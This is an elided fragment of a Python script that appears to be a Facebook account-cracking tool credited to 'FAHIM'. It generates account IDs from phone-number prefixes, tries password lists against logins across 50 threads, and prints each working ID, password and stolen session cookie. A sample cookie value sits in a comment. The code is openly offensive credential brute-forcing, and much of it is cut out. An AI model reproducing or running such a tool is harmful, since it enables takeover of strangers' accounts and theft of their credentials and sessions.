...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100073557657822')
logo = ("""
...
def riddu():
    ...
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}017,018,019{x}')
    print(" \033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××")
    rk1 = '0191'
    rk2 = '0172'
    rk3 = '0165'
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m FAHIM')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
           ...
           # 'cookie': 'datr=mPq0ZL4l_YJySLsHzm-ajKsp; sb=mPq0ZKmR-SRFCS13DxytjnSR',
           ...
           'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[FAHIM-OK😁] ' +uid+ ' | ' +ps+    '  \n[‎‎🙂]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
